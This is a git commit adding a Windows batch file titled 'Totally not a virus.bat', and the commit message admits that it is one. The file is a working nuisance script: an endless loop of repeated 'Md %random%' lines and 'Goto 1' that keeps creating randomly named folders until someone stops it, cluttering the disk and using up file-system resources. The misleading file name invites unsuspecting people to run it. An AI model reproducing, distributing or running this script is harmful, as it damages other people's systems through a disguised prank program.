2d312b4ade4596288e5d0590e50ae3cd2d845c46
Patrick Woodell <109560631+Magic-Dude@users.noreply.github.com>
2023-11-19 12:08:12 -0500

    Add files via upload
    It actually is

---
+++ Totally not a virus.bat
@@ -0,0 +1,380 @@
+@echo off
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+:1
+Md %random%
+Goto 1
